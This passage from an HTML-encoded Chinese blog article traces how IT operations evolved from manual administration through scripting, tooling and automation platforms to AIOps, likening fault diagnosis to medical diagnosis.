#x7EBF;&#x62CD;CT&#x3001;&#x62CD;&#x80F8;&#x7247;&#x6765;&#x900F;&#x89C6;&#x4EBA;&#x4F53;&#x8FDB;&#x4E00;&#x6B65;&#x89C2;&#x6D4B;&#x4EBA;&#x4F53;&#x7EC6;&#x5FAE;&#x53D8;&#x5316;&#x6765;&#x63A8;&#x65AD;&#x75C5;&#x56E0;&#xFF0C;&#x800C;&#x8FD0;&#x7EF4;&#x5DE5;&#x7A0B;&#x5E08;&#x5219;&#x4F1A;&#x628A;&#x6545;&#x969C;&#x5355;&#x5143;suspend&#x4F4F;&#xFF0C;&#x653E;&#x8BCA;&#x65AD;&#x5668;&#x8FDB;&#x884C;&#x8BCA;&#x65AD;&#xFF0C;&#x626B;&#x63CF;&#x5185;&#x5B58;&#x5806;&#x6808;&#x7B49;&#x6545;&#x969C;&#x73B0;&#x573A;&#x4FE1;&#x606F;&#x63A8;&#x5230;&#x51FA;&#x6545;&#x969C;&#x6839;&#x56E0;&#x7B49;&#x7B49;&#xFF0C;&#x5F88;&#x591A;&#x8FD0;&#x7EF4;&#x7406;&#x5FF5;&#x6765;&#x81F3;&#x533B;&#x5B66;&#x754C;&#x3002;&#x4F34;&#x968F;&#x79D1;&#x6280;&#x7684;&#x53D1;&#x5C55;&#x533B;&#x7597;&#x8BCA;&#x65AD;&#x624B;&#x6BB5;&#x5728;&#x4E0D;&#x65AD;&#x6F14;&#x8FDB;&#xFF0C;&#x4E0E;&#x533B;&#x7597;&#x754C;&#x4E00;&#x6837;&#x8FD0;&#x7EF4;&#x4E5F;&#x6709;&#x5176;&#x53D1;&#x5C55;&#x5386;&#x7A0B;&#x3002;</p><a id="more"></a><h3 id="IT&#x8FD0;&#x7EF4;&#x7684;&#x53D1;&#x5C55;&#x5386;&#x7A0B;"><a href="#IT&#x8FD0;&#x7EF4;&#x7684;&#x53D1;&#x5C55;&#x5386;&#x7A0B;" class="headerlink" title="IT&#x8FD0;&#x7EF4;&#x7684;&#x53D1;&#x5C55;&#x5386;&#x7A0B;"></a>IT&#x8FD0;&#x7EF4;&#x7684;&#x53D1;&#x5C55;&#x5386;&#x7A0B;</h3><p>&#x4E8B;&#x7269;&#x7684;&#x53D1;&#x5C55;&#x4E0D;&#x662F;&#x5B64;&#x7ACB;&#x7684;&#xFF0C;&#x8FD0;&#x7EF4;&#x4E5F;&#x4E0D;&#x4F8B;&#x5916;&#xFF0C;&#x5B83;&#x4E0E;&#x4E1A;&#x754C;&#x7684;&#x6574;&#x4E2A;&#x6280;&#x672F;&#x8D8B;&#x52BF;&#x53D1;&#x5C55;&#x662F;&#x76F8;&#x8F85;&#x76F8;&#x6210;&#x7684;&#x3002;&#x8FD9;&#x5C31;&#x8981;&#x6C42;&#x6211;&#x4EEC;&#x5173;&#x6CE8;&#x8FD0;&#x7EF4;&#x7684;&#x540C;&#x65F6;&#xFF0C;&#x4E5F;&#x8981;&#x5173;&#x6CE8;&#x6574;&#x4E2A;&#x6280;&#x672F;&#x8D8B;&#x52BF;&#x548C;&#x80CC;&#x666F;&#x6765;&#x8BF4;&#x8FD0;&#x7EF4;&#x53D1;&#x5C55;&#x5386;&#x7A0B;&#xFF1B;&#x4ECE;&#x4E0D;&#x540C;&#x7EF4;&#x5EA6;&#x5BF9;&#x7CFB;&#x7EDF;&#x8FD0;&#x7EF4;&#x5386;&#x7A0B;&#x8FDB;&#x884C;&#x603B;&#x7ED3;&#xFF0C;&#x5982;&#x6309;&#x4EBA;&#x5DE5;&#x5E72;&#x9884;&#x7A0B;&#x5EA6;&#x7EF4;&#x5EA6;&#x53EF;&#x628A;&#x8FD0;&#x7EF4;&#x53D1;&#x5C55;&#x7C97;&#x7565;&#x5206;&#x4E3A;&#xFF1A;&#x624B;&#x52A8;&#x8FD0;&#x7EF4;-&gt;&#x81EA;&#x52A8;&#x8FD0;&#x7EF4;-&gt;DevOps-&gt;&#x667A;&#x80FD;&#x8FD0;&#x7EF4;&#xFF1B;&#x5176;&#x4E2D;&#x5728;&#x8FD0;&#x7EF4;&#x53D1;&#x5C55;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x6700;&#x65E9;&#x51FA;&#x73B0;&#x7684;&#x662F;&#x624B;&#x5DE5;&#x8FD0;&#x7EF4;&#xFF1B;&#x5728;&#x5927;&#x91CF;&#x7684;&#x81EA;&#x52A8;&#x5316;&#x811A;&#x672C;&#x4EA7;&#x751F;&#x540E;&#xFF0C;&#x5C31;&#x6709;&#x4E86;&#x81EA;&#x52A8;&#x5316;&#x7684;&#x8FD0;&#x7EF4;&#xFF1B;&#x540E;&#x6765;&#x968F;&#x7740;&#x5FAE;&#x670D;&#x52A1;&#x3001;&#x5BB9;&#x5668;&#x6280;&#x672F;&#x5174;&#x8D77;&#x53C8;&#x51FA;&#x73B0;&#x4E86;DevOps&#xFF1B;&#x6700;&#x8FD1;&#x4E00;&#x4E24;&#x5E74;&#x968F;&#x6570;&#x636E;&#x79EF;&#x7D2F;&#x3001;&#x8BA1;&#x7B97;&#x673A;&#x7B97;&#x529B;&#x63D0;&#x5347;&#x53C8;&#x51FA;&#x73B0;&#x667A;&#x80FD;&#x8FD0;&#x7EF4;&#x3002;&#x672C;&#x6587;&#x91CD;&#x70B9;&#x4ECE;&#x53E6;&#x5916;&#x4E00;&#x79CD;&#x7EF4;&#x5EA6;&#x8FD0;&#x7EF4;&#x6280;&#x672F;&#x548C;&#x4EBA;&#x5DE5;&#x5E72;&#x9884;&#x7EC6;&#x7C92;&#x5EA6;&#x5212;&#x5206;&#x8FD0;&#x7EF4;&#x5386;&#x7A0B;&#xFF1A;</p><p><strong>&#x7B2C;&#x4E00;&#x4E2A;&#x9636;&#x6BB5;</strong>&#xFF0C;&#x4EBA;&#x5DE5;&#x4F5C;&#x574A;&#x9636;&#x6BB5;&#xFF0C;&#x6700;&#x521D;IT&#x7CFB;&#x7EDF;&#x5F53;&#x6211;&#x4EEC;&#x9047;&#x5230;&#x7684;&#x6240;&#x6709;&#x8FD0;&#x7EF4;&#x95EE;&#x9898;&#xFF0C;&#x57FA;&#x672C;&#x9760;&#x4EBA;&#x5DE5;&#x64CD;&#x4F5C;&#x5B8C;&#x6210;&#x3002;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x7CFB;&#x7EDF;&#x89C4;&#x6A21;&#x4E0D;&#x5927;&#xFF0C;&#x9047;&#x5230;&#x7684;&#x95EE;&#x9898;&#x76F8;&#x5BF9;&#x7B80;&#x5355;&#xFF0C;&#x5927;&#x591A;&#x96C6;&#x4E2D;&#x5728;&#x786C;&#x4EF6;&#x3001;&#x7F51;&#x7EDC;&#x548C;&#x7CFB;&#x7EDF;&#x5C42;&#x9762;&#xFF0C;&#x6240;&#x4EE5;&#x6709;&#x4E00;&#x5B9A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x6216;&#x7F51;&#x7EDC;&#x7EF4;&#x62A4;&#x7ECF;&#x9A8C;&#x7684;&#x4EBA;&#x5C31;&#x53EF;&#x4EE5;&#x641E;&#x5B9A;&#x3002;&#x8FD9;&#x79CD;&#x573A;&#x666F;&#x4E0B;&#x7684;&#x8FD0;&#x7EF4;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x5E38;&#x8BF4;&#x7684; SA&#xFF0C;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#xFF1B;&#x901A;&#x8FC7;&#x96C7;&#x4F63;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#x8FD0;&#x7EF4;&#x590D;&#x6742;&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#xFF0C;&#x4E00;&#x822C;&#x8EAB;&#x517C;&#x591A;&#x804C;&#xFF0C;&#x4EBA;&#x6570;&#x4E5F;&#x4E0D;&#x592A;&#x591A;&#xFF0C;&#x662F;&#x5F53;&#x65F6;&#x4E1A;&#x754C;&#x6BD4;&#x8F83;&#x666E;&#x904D;&#x7684;&#x505A;&#x6CD5;&#x3002;&#x4F46;&#x968F;&#x7740;&#x7CFB;&#x7EDF;&#x53D8;&#x5F97;&#x8D8A;&#x6765;&#x8D8A;&#x590D;&#x6742;&#xFF0C;&#x7EC4;&#x4EF6;&#x8D8A;&#x6765;&#x8D8A;&#x591A;&#xFF0C;&#x7528;&#x6237;&#x6D41;&#x7A0B;&#x4E0D;&#x65AD;&#x4E0A;&#x5347;&#xFF0C;&#x9700;&#x8981;&#x516C;&#x53F8;&#x62DB;&#x8058;&#x66F4;&#x591A;&#x7684;&#x7CFB;&#x7EDF;&#x7BA1;&#x7406;&#x5458;&#x6765;&#x5E94;&#x5BF9;&#x65E5;&#x76CA;&#x589E;&#x591A;&#x4E8B;&#x4EF6;&#x3002;&#x7CFB;&#x7EDF;&#x8FD0;&#x7EF4;&#x6210;&#x672C;&#x4E0D;&#x65AD;&#x589E;&#x52A0;&#x3002;</p><p><strong>&#x7B2C;&#x4E8C;&#x4E2A;&#x9636;&#x6BB5;</strong>&#xFF0C;&#x811A;&#x672C;&#x5DE5;&#x5177;&#x9636;&#x6BB5;&#xFF0C;&#x4E00;&#x822C;&#x7EDD;&#x5927;&#x591A;&#x6570;&#x4F01;&#x4E1A;&#x90FD;&#x4F1A;&#x5F88;&#x5FEB;&#x4ECE;&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x8FC7;&#x6E21;&#x5230;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#xFF0C;&#x56E0;&#x4E3A;&#x4E0A;&#x4E00;&#x9636;&#x6BB5;&#x7684;&#x5927;&#x91CF;&#x91CD;&#x590D;&#x7E41;&#x7410;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x5B8C;&#x5168;&#x53EF;&#x4EE5;&#x8F6C;&#x5316;&#x4E3A;&#x811A;&#x672C;&#x6765;&#x5B9E;&#x73B0;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x6BCF;&#x6B21;&#x90FD;&#x53BB;&#x6572;&#x4E00;&#x5806;&#x7C7B;&#x4F3C;&#x7684;&#x547D;&#x4EE4;&#x3002;&#x65E9;&#x671F;&#x7684; SA &#x4E3B;&#x8981;&#x4EE5;&#x5404;&#x79CD; shell &#x4E3A;&#x4E3B;&#xFF0C;&#x6240;&#x4EE5;&#x5F88;&#x591A; SA &#x5982;&#x679C;&#x4F1A; shell &#x7F16;&#x5199;&#x4E00;&#x4E9B;&#x6279;&#x5904;&#x7406;&#x811A;&#x672C;&#xFF0C;&#x5C31;&#x4F1A;&#x5F88;&#x6709;&#x7ADE;&#x4E89;&#x529B;&#x4E86;&#x3002;&#x518D;&#x5F80;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x5927;&#x5BB6;&#x6240;&#x719F;&#x77E5;&#x7684; Perl&#x3001;Ruby&#x3001;Python &#x7B49;&#x52A8;&#x6001;&#x8BED;&#x8A00;&#x4E5F;&#x88AB;&#x5E7F;&#x6CDB;&#x5E94;&#x7528;&#x4E8E;&#x811A;&#x672C;&#x5DE5;&#x5177;&#x7684;&#x5B9E;&#x73B0;&#xFF0C;&#x7279;&#x522B;&#x662F;&#x4E00;&#x4E9B;&#x903B;&#x8F91;&#x548C;&#x573A;&#x666F;&#x76F8;&#x5BF9;&#x590D;&#x6742;&#x7684;&#x81EA;&#x52A8;&#x5316;&#x5B9E;&#x73B0;&#x3002;</p><p><strong>&#x7B2C;&#x4E09;&#x4E2A;&#x9636;&#x6BB5;</strong>&#xFF0C;&#x6D41;&#x7A0B;&#x548C;&#x5DE5;&#x5177;&#x9636;&#x6BB5;&#xFF0C;&#x5F53;&#x6211;&#x4EEC;&#x628A;&#x4E00;&#x4E9B;&#x590D;&#x6742;&#x7684;&#x64CD;&#x4F5C;&#x5C01;&#x88C5;&#x6210;&#x4E00;&#x4E2A;&#x4E2A;&#x7684;&#x811A;&#x672C;&#x540E;&#xFF0C;&#x6548;&#x7387;&#x786E;&#x5B9E;&#x4F1A;&#x63D0;&#x5347;&#x5F88;&#x591A;&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x6240;&#x9762;&#x5BF9;&#x7684;&#x4E1A;&#x52A1;&#x573A;&#x666F;&#x548C;&#x4F53;&#x91CF;&#x4E5F;&#x5728;&#x53D8;&#x5F97;&#x66F4;&#x590D;&#x6742;&#x3002;&#x6BD4;&#x5982;&#xFF0C;&#x5BF9;&#x4E8E;&#x8FD0;&#x7EF4;&#x540C;&#x5B66;&#xFF0C;&#x4EE5;&#x524D;&#x5C31;&#x662F;&#x8D1F;&#x8D23;&#x5B89;&#x88C5;&#x548C;&#x914D;&#x7F6E;&#x4E00;&#x4E0B;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#xFF0C;&#x5982;&#x679C;&#x662F;&#x51E0;&#x5341;&#x53F0;&#x6216;&#x767E;&#x53F0;&#x7684;&#x89C4;&#x6A21;&#xFF0C;&#x811A;&#x672C;&#x6279;&#x91CF;&#x6267;&#x884C;&#x5B8C;&#x5168;&#x53EF;&#x4EE5;&#x641E;&#x5B9A;&#x3002;&#x518D;&#x5F80;&#x540E;&#xFF0C;&#x8FD0;&#x7EF4;&#x8FD8;&#x8981;&#x8D1F;&#x8D23;&#x8F6F;&#x4EF6;&#x7684;&#x9891;&#x7E41;&#x53D1;&#x5E03;&#xFF0C;&#x6BCF;&#x5468;&#x8981;&#x591A;&#x6B21;&#xFF0C;&#x751A;&#x81F3;&#x662F;&#x6BCF;&#x5929;&#x90FD;&#x4F1A;&#x6709;&#xFF0C;&#x8FD9;&#x662F;&#x7531;&#x4E1A;&#x52A1;&#x7279;&#x70B9;&#x51B3;&#x5B9A;&#x7684;&#xFF0C;&#x7279;&#x522B;&#x662F;&#x4E92;&#x8054;&#x7F51;&#x7C7B;&#x578B;&#x7684;&#x4E1A;&#x52A1;&#xFF0C;&#x4E0E;&#x539F;&#x6765;&#x4F20;&#x7EDF;&#x7684;&#x6BCF;&#x4E2A;&#x6708;&#x3001;&#x751A;&#x81F3;&#x51E0;&#x4E2A;&#x6708;&#x53D1;&#x5E03;&#x4E00;&#x6B21;&#x7684;&#x573A;&#x666F;&#x8981;&#x6C42;&#x5B8C;&#x5168;&#x4E0D;&#x4E00;&#x6837;&#x4E86;&#x3002;&#x800C;&#x4E14;&#x968F;&#x7740;&#x7528;&#x6237;&#x4F53;&#x91CF;&#x7684;&#x589E;&#x52A0;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x6570;&#x91CF;&#x53EF;&#x80FD;&#x5DF2;&#x7ECF;&#x5230;&#x4E86;&#x51E0;&#x767E;&#x4E0A;&#x5343;&#x53F0;&#xFF0C;&#x800C;&#x4E14;&#x90E8;&#x7F72;&#x7684;&#x4E1A;&#x52A1;&#x4E5F;&#x4E0D;&#x5C3D;&#x76F8;&#x540C;&#xFF0C;&#x6240;&#x4EE5;&#x5355;&#x7EAF;&#x9760;&#x811A;&#x672C;&#x6267;&#x884C;&#xFF0C;&#x5DF2;&#x7ECF;&#x5B8C;&#x5168;&#x4E0D;&#x80FD;&#x6EE1;&#x8DB3;&#x8981;&#x6C42;&#x3002;&#x8FD9;&#x65F6;&#x5019;&#xFF0C;&#x5C31;&#x8981;&#x9762;&#x4E34;&#x66F4;&#x52A0;&#x590D;&#x6742;&#x5316;&#x7684;&#x573A;&#x666F;&#x5B9E;&#x73B0;&#xFF0C;&#x6BD4;&#x5982;&#x505A;&#x4E00;&#x6B21;&#x4E1A;&#x52A1;&#x90E8;&#x7F72;&#xFF0C;&#x8FD0;&#x7EF4;&#x540C;&#x5B66;&#x53EF;&#x80FD;&#x8981;&#x5B89;&#x88C5;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x505A;&#x7CFB;&#x7EDF;&#x914D;&#x7F6E;&#x53D8;&#x66F4;&#xFF0C;&#x5B89;&#x88C5;&#x8F6F;&#x4EF6;&#x5305;&#x3001;&#x542F;&#x505C;&#x8FDB;&#x7A0B;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x4E0A;&#x914D;&#x7F6E;&#x670D;&#x52A1;&#x7B49;&#x7B49;&#x3002;&#x8FD9;&#x65F6;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x6709;&#x4E00;&#x4E2A;&#x6D41;&#x7A0B;&#x5C06;&#x4E00;&#x4E2A;&#x4E2A;&#x7684;&#x811A;&#x672C;&#x529F;&#x80FD;&#x4E32;&#x8054;&#x8D77;&#x6765;&#xFF0C;&#x540C;&#x65F6;&#x8FD8;&#x8981;&#x6709;&#x4E00;&#x4E9B;&#x811A;&#x672C;&#x6267;&#x884C;&#x7ED3;&#x679C;&#x6821;&#x9A8C;&#x53CA;&#x5224;&#x65AD;&#x7684;&#x8FC7;&#x7A0B;&#x3002;&#x540C;&#x65F6;&#x5BF9;&#x4E8E;&#x7535;&#x4FE1;&#x9886;&#x57DF;&#x5BF9;&#x4EA7;&#x54C1;&#x7684;&#x5347;&#x7EA7;&#x53D8;&#x66F4;&#x6709;&#x4E25;&#x683C;&#x7684;&#x64CD;&#x4F5C;&#x89C4;&#x8303;&#x4EE5;&#x53CA;&#x6D41;&#x7A0B;&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x8FD9;&#x5C31;&#x5BF9;&#x6D41;&#x7A0B;&#x548C;&#x5DE5;&#x5177;&#x5E73;&#x53F0;&#x6709;&#x4E86;&#x66F4;&#x5927;&#x7684;&#x8BC9;&#x6C42;&#xFF0C;</p><p><strong>&#x7B2C;&#x56DB;&#x4E2A;&#x9636;&#x6BB5;</strong>&#xFF0C;&#x8FD0;&#x7EF4;&#x5E73;&#x53F0;&#x5316;&#x65E2;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x9636;&#x6BB5;&#xFF0C;&#x4E5F;&#x662F;&#x5F53;&#x524D;&#x6240;&#x5904;&#x9636;&#x6BB5;&#xFF1B;&#x968F;&#x7740;&#x8FD0;&#x7EF4;&#x6D41;&#x7A0B;&#x5316;&#x53D1;&#x5C55;&#xFF0C;&#x8F83;&#x5927;IT&#x516C;&#x53F8;&#x8FDB;&#x4E00;&#x6B65;&#x8FDB;&#x884C;&#x8FD0;&#x7EF4;&#x4F53;&#x7CFB;&#x5316;&#x6539;&#x9020;&#x589E;&#x52A0;&#x81EA;&#x52A8;&#x5316;&#x7A0B;&#x5EA6;&#xFF0C;&#x8FD9;&#x5C31;&#x5230;&#x4E86;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x9636;&#x6BB5;&#xFF0C;&#x5927;&#x516C;&#x53F8;&#x9488;&#x5BF9;&#x81EA;&#x5DF1;&#x4E1A;&#x52A1;&#x7279;&#x5F81;&#x6784;&#x7B51;&#x5927;&#x578B;&#x8FD0;&#x7EF4;&#x5E73;&#x53F0; &#x5982;&#xFF1A;&#x817E;&#x8BAF;&#x6E38;&#x620F;&#x7CFB;&#x7EDF;&#x7684;&#x84DD;&#x9CB8;&#x7CFB;&#x7EDF;&#xFF0C;&#x817E;&#x8BAF;&#x793E;&#x4EA4;&#x9886;&#x57DF;&#x7684;&#x7EC7;&#x4E91;&#x7CFB;&#x7EDF;&#xFF0C;&#x963F;&#x91CC;&#x7535;&#x5546;&#x9886;&#x57DF;&#x7684;&#x9E70;&#x773C;&#x7CFB;&#x7EDF;&#xFF0C;&#x6211;&#x53F8;&#x9488;&#x5BF9;&#x4E91;&#x4E1A;&#x52A1;CloudBU&#x7684;CloudScope&#x7B49;&#x7B49;&#xFF1B;&#x968F;&#x7740;&#x793E;&#x4F1A;&#x5728;&#x7EBF;&#x5316;&#x7684;&#x7A0B;&#x5EA6;&#x4E0D;&#x65AD;&#x63D0;&#x5347;&#xFF0C;&#x5404;&#x5927;&#x4F01;&#x4E1A;&#x4E5F;&#x5F00;&#x59CB;&#x610F;&#x8BC6;&#x5230;&#x7CFB;&#x7EDF;&#x8FD0;&#x7EF4;&#x5BF9;&#x4E8E;&#x4F01;&#x4E1A;&#x7684;&#x6548;&#x7387;&#x3001;&#x7A33;&#x5B9A;&#x548C;&#x6210;&#x672C;&#x6709;&#x7740;&#x51B3;&#x5B9A;&#x6027;&#x4F5C;&#x7528;&#xFF0C;&#x5BF9;&#x8FD0;&#x7EF4;&#x7684;&#x8BC9;&#x6C42;&#x548C;&#x8981;&#x6C42;&#x4E5F;&#x8D8A;&#x6765;&#x8D8A;&#x9AD8;&#x3002;&#x8FD0;&#x7EF4;&#x5C97;&#x4F4D;&#x771F;&#x6B63;&#x5730;&#x88AB;&#x91CD;&#x89C6;&#xFF0C;&#x540C;&#x65F6;&#x8FD0;&#x7EF4;&#x884C;&#x4E1A;&#x6709;&#x81EA;&#x5DF1;&#x5782;&#x76F4;&#x7684;&#x6280;&#x672F;&#x5927;&#x4F1A;&#x5982;GOPS&#x5927;&#x4F1A;&#xFF0C;&#x540C;&#x65F6;QCon &#x4EE5;&#x53CA; ArchSummit &#x8FD9;&#x6837;&#x7684;&#x9876;&#x7EA7;&#x6280;&#x672F;&#x5CF0;&#x4F1A;&#xFF0C;&#x5F00;&#x59CB;&#x4E13;&#x95E8;&#x8BBE;&#x7F6E;&#x8FD0;&#x7EF4;&#x4E13;&#x9898;&#x3002;</p><p>&#x7531;&#x6280;&#x672F;&#x4F53;&#x7CFB;&#x53D1;&#x5C55;&#xFF0C;&#x8FD0;&#x7EF4;&#x6240;&#x9762;&#x4E34;&#x7684;&#x573A;&#x666F;&#x590D;&#x6742;&#x5EA6;&#x4E5F;&#x6025;&#x5267;&#x4E0A;&#x5347;&#xFF0C;&#x539F;&#x6709;&#x7684;&#x8FD0;&#x7EF4;&#x6280;&#x80FD;&#x5982;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7EF4;&#x62A4;&#x3001;&#x7CFB;&#x7EDF;&#x914D;&#x7F6E;&#x3001;&#x811A;&#x672C;&#x7F16;&#x5199;&#x5DF2;&#x7ECF;&#x5B8C;&#x5168;&#x6EE1;&#x8DB3;&#x4E0D;&#x4E86;&#x8981;&#x6C42;&#x3002;&#x540C;&#x65F6;&#xFF0C;&#x7531;&#x4E8E;&#x8F6F;&#x4EF6;&#x7CFB;&#x7EDF;&#x590D;&#x6742;&#x5EA6;&#x7684;&#x63D0;&#x5347;&#xFF0C;&#x4E5F;&#x9700;&#x8981;&#x8FD0;&#x7EF4;&#x6295;&#x5165;&#x66F4;&#x591A;&#x7684;&#x7CBE;&#x529B;&#x53BB;&#x5173;&#x6CE8;&#x4E1A;&#x52A1;&#x8F6F;&#x4EF6;&#x67B6;&#x6784;&#x548C;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x4E0A;&#x3002;&#x6240;&#x4EE5;&#x5C31;&#x6D6E;&#x73B0;&#x51FA;&#x6211;&#x4EEC;&#x6240;&#x719F;&#x77E5;&#x7684; DevOps&#xFF0C;SRE&#x3001;PE&#x3001;&#x5E94;&#x7528;&#x8FD0;&#x7EF4;&#x3001;&#x6280;&#x672F;&#x8FD0;&#x8425;&#x8FD9;&#x4E9B;&#x65B0;&#x7684;&#x540D;&#x5B57;&#x3001;&#x5C97;&#x4F4D;&#x6216;&#x7406;&#x5FF5;&#x3002;</p><p><strong>&#x7B2C;&#x4E94;&#x4E2A;&#x9636;&#x6BB5;</strong>&#xFF1A;&#x667A;&#x80FD;&#x8FD0;&#x7EF4;&#x9636;&#x6BB5;&#x6216;AIOps&#xFF0C;&#x968F;&#x7740;&#x673A;&#x5668;&#x5B66;&#x4E60;&#x7B97;&#x6CD5;&#x7A81;&#x7834;&#x3001;&#x8BA1;&#x7B97;&#x80FD;&#x529B;&#x63D0;&#x5347;&#x5982; GPU&#x3001;&#x6D77;&#x91CF;&#x6570;&#x636E;&#x5E26;&#x6765;&#x4E86;AI&#x9769;&#x547D;&#xFF0C;&#x800C;AIOps &#x5C06;&#x4EBA;&#x5DE5;&#x667A;&#x80FD;&#x5E94;&#x7528;&#x4E8E;&#x8FD0;&#x7EF4;&#x9886;&#x57DF;&#xFF0C;&#x57FA;&#x4E8E;&#x5DF2;&#x6709;&#x7684;&#x8FD0;&#x7EF4;&#x6570;&#x636E; (&#x65E5;&#x5FD7;&#x3001;&#x76D1;&#x63A7;&#x4FE1;&#x606F;&#x3001;&#x5E94;&#x7528;&#x4FE1;&#x606F;&#x7B49;)&#xFF0C;&#x901A;&#x8FC7;&#x673A;&#x5668;&#x5B66;&#x4E60;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x8FDB;&#x4E00;&#x6B65;&#x89E3;&#x51B3;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x6240;&#x4E0D;&#x80FD;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x63D0;&#x9AD8;&#x7CFB;&#x7EDF;&#x7684;&#x9884;&#x5224;&#x80FD;&#x529B;&#x3001;&#x7A33;&#x5B9A;&#x6027;&#x3001;&#x964D;&#x4F4E;IT&#x6210;&#x672C;&#xFF0C;&#x5E76;&#x63D0;&#x9AD8;&#x4F01;&#x4E1A;&#x7684;&#x4EA7;&#x54C1;&#x7ADE;&#x4E89;&#x529B;&#x3002;&#x4E0D;&#x8FC7;&#x5F53;&#x524D;&#x4EC5;&#x6709;&#x56FD;&#x5185;&#x5916;&#x7684;&#x5927;&#x5382;&#xFF0C;&#x901A;&#x8FC7;&#x4E00;&#x4E9B;&#x7B97;&#x6CD5;&#x89E3;&#x51B3;&#x5355;&#x70B9;&#x7684;&#x8FD0;&#x7EF4;&#x95EE;&#x9898;&#xFF0C;&#x667A;&#x80FD;&#x8FD0;&#x7EF4;&#x4E4B;&#x8DEF;&#x4EC5;&#x5904;&#x4E8E;&#x521D;&#x7EA7;&#x9636;&#x6BB5;&#xFF0C;AIOps &#x7684;&#x53D1;&#x5C55;&#x4E00;&#x5B9A;&#x662F;&#x4E00;&#x4E2A;&#x957F;&#x671F;&#x6F14;&#x8FDB;&#x7684;&#x8FC7;&#x7A0B;&#x3002;&#x540C;&#x65F6;AI &#x662F; Ops &#x7684;&#x6709;&#x529B;&#x8865;&#x5145;&#xFF0C;&#x8FDB;&#x4E00;&#x6B65;&#x964D;&#x4F4E;&#x8FD0;&#x7EF4;&#x7684;&#x5DE5;&#x4F5C;&#x5F3A;&#x5EA6;&#x548C;&#x538B;&#x529B;&#xFF0C;&#x4F46;&#x662F; AIOps &#x4E00;&#x5B9A;&#x5EFA;&#x8BBE;&#x5728;&#x9AD8;&#x5EA6;&#x81EA;&#x52A8;&#x5316;&#x548C;&#x5B8C;&#x5584;&#x7684;&#x8FD0;&#x7EF4;&#x4F53;&#x7CFB;&#x4E4B;&#x4E0A;&#x7684;&#xFF0C;&#x662F;&#x4E00;&#x4E2A;&#x6F14;&#x8FDB;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x4E0D;&#x4F1A;&#x662F;&#x4E00;&#x4E2A;&#x8DF3;&#x8DC3;&#x6027;&#x7684;&#x8FC7;&#x7A0B;&#xFF0C;&#x4E5F;&#x4E0D;&#x4F1A;&#x4EA7;&#x751F;&#x4E00;&#x4E2A;&#x5B8C;&#x5168;&#x98A0;&#x8986;&#x6027;&#x7684; AIOps &#x6A21;&#x5F0F;&#xFF0C;&#x5C06;&#x73B0;&#x6709;&#x7684; Ops &#x4F53;&#x7CFB;&#x66FF;&#x4EE3;&#x6389;&#x3002;</p><p>&#x6BEB;&#x65E0;&#x7591;&#x95EE;&#xFF0C;&#x8FD0;&#x7EF4;&#x6280;&#x672F;&#x7684;&#x53D1;&#x5C55;&#x5DF2;&#x7ECF;&#x8FDB;&#x5165;&#x4E86;&#x6DF1;&#x6C34;&#x671F;&#x3002;&#x968F;&#x7740;Docker&#x3001;OpenStack&#x3001;Puppet&#x7B49;&#x6280;&#x672F;&#x7684;&#x6D41;&#x884C;&#xFF0C;&#x4EE5;&#x53CA;CI/CD&#x3001;DevOps&#x7B49;&#x7406;&#x5FF5;&#x7684;&#x843D;&#x5730;&#x751F;&#x6839;&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x7684;&#x53D1;&#x5C55;&#x8FCE;&#x6765;&#x4E86;&#x5C0F;&#x9AD8;&#x6F6E;&#x3002;&#x6574;&#x4F53;&#x6765;&#x770B;&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x5E73;&#x53F0;&#x5E2E;&#x52A9;&#x63D0;&#x5347;&#x4E86;&#x8FD0;&#x7EF4;&#x7684;&#x6548;&#x7387;&#xFF0C;&#x5E76;&#x51CF;&#x5C11;&#x4E86;&#x56E0;&#x4EBA;&#x5DE5;&#x548C;&#x6D41;&#x7A0B;&#x64CD;&#x4F5C;&#x800C;&#x5F15;&#x8D77;&#x7684;&#x8FD0;&#x7EF4;&#x6545;&#x969C;&#x3002;</p><p>&#x8BB0;&#x5F97;&#x5728;2001&#x5E74;&#x7684;&#x65F6;&#x5019;&#xFF0C;Gartner 